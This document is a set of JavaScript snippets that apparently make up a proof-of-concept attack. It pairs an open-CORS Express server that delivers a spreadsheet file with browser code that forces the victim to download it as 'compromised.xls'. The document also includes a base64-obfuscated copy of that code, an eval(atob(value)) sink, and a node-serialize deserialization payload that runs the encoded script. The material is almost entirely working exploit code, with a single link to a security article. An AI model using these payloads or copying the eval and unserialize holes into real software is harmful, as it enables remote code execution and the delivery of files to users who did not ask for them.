////////////////////////

const express = require('express')
const app = express()
const port = 3000

app.use(function(req, res, next) {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  next();
});


app.get('/', function(req, res, next) {
  res.setHeader('Content-Type', 'application/vnd.ms-excel');
  res.setHeader('Content-disposition','attachment; filename=application.xlt');
  res.send( ['hello', 'world'].join(",") );
});


app.listen(port, () => console.log(`This app is listening on port ${port} and purposefully allowing cross origin requests!`))

//////////////////
//
//


const express = require('express')
const app = express()
const port = 4000

app.use('/', express.static('public'))

app.listen(port, () => console.log(`This server is listening on port ${port} and presents a basic static file host!`))

////////////////////
//
//


   
/*
fetch('http://localhost:3000')
.then(response => response.blob()).then(function(data) {
const u = window.URL.createObjectURL(new Blob([data], {type: 'application/vnd.ms-excel'}))
const t = document.createElement('a')
t.href = u
t.setAttribute('download', "compromised.xls")
document.body.appendChild(t)
t.click()
});
*/

/*
ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMCcpCi50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLmJsb2IoKSkudGhlbihmdW5jdGlvbihkYXRhKSB7CmNvbnN0IHUgPSB3aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbZGF0YV0sIHt0eXBlOiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJ30pKQpjb25zdCB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpCnQuaHJlZiA9IHUKdC5zZXRBdHRyaWJ1dGUoJ2Rvd25sb2FkJywgImNvbXByb21pc2VkLnhscyIpCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodCkKdC5jbGljaygpCn0pOw==
*/

export default function(value) {
  eval(atob(value));
}


////////////////////
////////////////////
// https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/


var serialize = require('node-serialize');

/* _$$ND_FUNC$$_eval(atob('ZmV0Y2goImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMCIpLnRoZW4oYT0+YS5ibG9iKCkpLnRoZW4oZnVuY3Rpb24oYSl7Y29uc3QgYj13aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbYV0se3R5cGU6ImFwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbCJ9KSksYz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJhIik7Yy5ocmVmPWIsYy5zZXRBdHRyaWJ1dGUoImRvd25sb2FkIiwiY29tcHJvbWlzZWQueGxzIiksZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjKSxjLmNsaWNrKCl9KQoK'))
*/

export default function(value) {
  var obj = { path: value };
  serialize.unserialize(obj);
}


////////////////////
////////////////////
//
//
